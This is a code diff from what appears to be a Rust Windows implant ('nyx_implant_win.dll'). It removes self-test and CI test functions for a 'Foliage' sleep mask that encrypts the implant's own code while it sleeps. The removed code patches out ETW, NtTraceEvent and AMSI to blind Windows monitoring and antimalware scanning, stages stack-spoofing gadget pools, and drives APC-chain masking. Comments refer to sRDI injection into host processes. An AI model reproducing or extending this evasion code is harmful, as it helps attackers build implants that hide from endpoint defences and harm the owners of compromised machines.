@@ -970,43 +970,8 @@ pub unsafe extern "system" fn nyx_linger() {
 // Invoke: rundll32 nyx_implant_win.dll,nyx_linger_foliage  (then scan its PID).
 // ============================================================================
 
-#[cfg(feature = "selftest")]
-#[no_mangle]
-pub unsafe extern "system" fn nyx_linger_foliage() {
-    // Foliage APC-chain sleep mask is known to crash under rundll32-hosted
-    // DLLs (NtSetContextThread restore mishandles the thread context in the
-    // rundll32 loader — see sleep.rs module docs). Detect early and exit
-    // cleanly so the selftest doesn't produce a false-positive crash.
-    // For real foliage testing, inject via sRDI into a host process.
-    let is_rundll32 = unsafe { crate::resolve::module_base_by_name(b"rundll32.exe").is_some() };
-    if is_rundll32 {
-        // Safe exit: rundll32 can't safely run the APC chain. Signal
-        // "skipped" with exit code 1 (distinct from true pass=0).
-        unsafe { exit(1) };
-    }
-
-    // Same runtime bring-up as nyx_linger.
-    crate::syscalls::init_global();
-    let _ = crate::blind::patch_etw();
-    let _ = crate::blind::patch_nt_trace_event();
-    let _ = crate::blind::patch_amsi();
-    let scanner = crate::evasion_glue::LivePdataScanner;
-    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
-        let leaked: &'static _ = alloc::boxed::Box::leak(alloc::boxed::Box::new(pool));
-        unsafe { crate::stack::set_gap_pool(leaked) };
-        let _ = crate::stack::stage_for(leaked);
-    }
-    // ARM the Foliage sleep mask for the duration of the linger window.
-    crate::sleep::set_foliage_enabled(true);
-    // 30 × 1s sleeps through sleep::sleep → execute_foliage_plan (mask/sleep/
-    // unmask). sleep::sleep handles the armed path and degrades safely if the
-    // own-text region can't be resolved (it falls back to raw NtDelayExecution).
-    for _ in 0..30 {
-        crate::sleep::sleep(1);
-    }
-    crate::sleep::set_foliage_enabled(false);
-    unsafe { exit(0) };
-}
+// Marker: %TEMP%\nyx_etwti_status.txt with "code=<hex> status=<signed-dec>" per line.
+// ============================================================================
 
 // ============================================================================
 // nyx_selftest_blind_provider: exercise blind::disable_etw_provider against the
@@ -2437,63 +2402,8 @@ fn join(base: &str, suffix: &str) -> String {
 // corrupt the running image (we're executing through .text — if RC4 left it
 // encrypted we'd never reach the exit).
 // ============================================================================
-
-#[cfg(feature = "selftest")]
-#[no_mangle]
-pub unsafe extern "system" fn nyx_selftest_foliage() {
-    let mut mask: u32 = 0;
-    crate::sleep::set_foliage_enabled(true);
-    // One 1-second sleep through the Foliage path. If it returns, the mask/
-    // unmask round-trip didn't corrupt the running image.
-    crate::sleep::sleep(1);
-    mask |= 1 << 0; // reached the exit → no crash
-    crate::sleep::set_foliage_enabled(false);
-    unsafe { exit(mask) };
-}
-
-// ============================================================================
-// nyx_selftest_foliage_apc: exercise the real Foliage APC chain (Task E). Arms
-// Foliage, runs ONE 2-second sleep through sleep::sleep → execute_foliage_apc
-// (helper thread masks .text → queues APC → sleeps → unmasks), then reads the
-// FOLIAGE_APC_OK diagnostic.
-//   bit0 = reached the exit (no crash — the running image survived the
-//          .text encrypt/decrypt round-trip; if .text came back still
-//          encrypted we'd never reach here),
-//   bit1 = FOLIAGE_APC_OK == 1 (full APC chain completed + .text verified),
-//   bit2 = FOLIAGE_APC_OK == 2 (attempted but degraded to the data-only floor
-//          — honest: the APC path ran but did not fully succeed).
-// ⚠️ This manipulates another thread + flips .text protection; a bug here
-// crashes the implant (user-mode, not a BSOD). If bit0 is NOT set on the host
-// the CONTEXT/APC/timing needs single-stepping in a target VM.
-// ============================================================================
-
-#[cfg(feature = "selftest")]
-#[no_mangle]
-pub unsafe extern "system" fn nyx_selftest_foliage_apc() {
-    let mut mask: u32 = 0;
-    crate::sleep::set_foliage_enabled(true);
-    // P4: force the APC gate ON + wire the PIC thunk for this selftest
-    // (otherwise both default OFF and foliage_helper runs the data-only floor,
-    // never setting FOLIAGE_APC_OK=1). Restore on exit.
-    let prev_apc = crate::sleep::set_foliage_apc_enabled(true);
-    let prev_wired = crate::sleep::set_foliage_apc_thunk_wired(true);
-    crate::sleep::sleep(2); // 2s window: helper masks .text, queues APC, unmasks
-    mask |= 1 << 0; // reached the exit → no crash (image survived)
-    let st = crate::sleep::foliage_apc_status();
-    let stage = crate::sleep::foliage_stage();
-    if st == 1 {
-        mask |= 1 << 1; // full APC chain succeeded + .text round-trip verified
-    } else if st == 2 {
-        mask |= 1 << 2; // attempted but degraded (data-only floor ran)
-    }
-    // Encode stage bitmask into upper byte: mask |= (stage as u32) << 8.
-    // Bits 8-14 = FOLIAGE_STAGE bitmask (which stage got to before failure).
-    mask |= (stage as u32) << 8;
-    crate::sleep::set_foliage_apc_thunk_wired(prev_wired);
-    crate::sleep::set_foliage_apc_enabled(prev_apc);
-    crate::sleep::set_foliage_enabled(false);
-    unsafe { exit(mask) };
-}
+// NOTE: nyx_selftest_foliage and nyx_selftest_foliage_apc were removed — the
+// Foliage APC chain is dead code (superseded by Fluctuation sleep mask).
 
 // ============================================================================
 // P2.1a-ii swap decision: confirm the staging + decide() path runs without
@@ -3018,49 +2928,6 @@ mod ci_tests {
     /// table are never set up. Idempotent — safe to call per test.
     fn init_rt() {
         unsafe { crate::syscalls::init_global() };
-    }
-
-    /// P4 data-only Foliage: arm mask, sleep 1s, verify no crash.
-    #[test]
-    fn ci_foliage_data_only_survives_one_cycle() {
-        init_rt();
-        if !crate::sleep::foliage_enabled() {
-            eprintln!("skipped: FOLIAGE_ENABLED off");
-            return;
-        }
-        // One 1s sleep through the Foliage data-only path. If this returns,
-        // the mask/unmask round-trip didn't corrupt the running image.
-        crate::sleep::sleep(1);
-        // Pass = reached this line without crash.
-    }
-
-    /// P4 Foliage APC: exercise the full APC chain (PIC thunk + .text RC4).
-    /// Expects FOLIAGE_APC_OK > 0 after a 2s sleep cycle.
-    #[test]
-    fn ci_foliage_apc_survives_one_cycle() {
-        init_rt();
-        if !crate::sleep::foliage_apc_enabled() {
-            eprintln!("skipped: FOLIAGE_APC_ENABLED off");
-            return;
-        }
-        // Wire the PIC thunk — without this, foliage_helper degrades to the
-        // data-only floor and FOLIAGE_APC_OK stays 0 (this test exists to
-        // validate the thunk path on CI, not the data-only fallback).
-        let prev_wired = crate::sleep::set_foliage_apc_thunk_wired(true);
-        // 2s window: helper builds thunk, masks .text, queues APC, unmasks.
-        crate::sleep::sleep(2);
-        let status = crate::sleep::foliage_apc_status();
-        let stage = crate::sleep::foliage_stage();
-        crate::sleep::set_foliage_apc_thunk_wired(prev_wired);
-        if status == 0 {
-            eprintln!("FOLIAGE_APC_OK={} FOLIAGE_STAGE={:#x}", status, stage);
-        }
-        assert!(
-            status > 0,
-            "Foliage APC chain did not complete — FOLIAGE_APC_OK={} STAGE={:#x}",
-            status,
-            stage
-        );
     }
 
     /// P5 Pool Party: section delivery to self. Validates the NT section
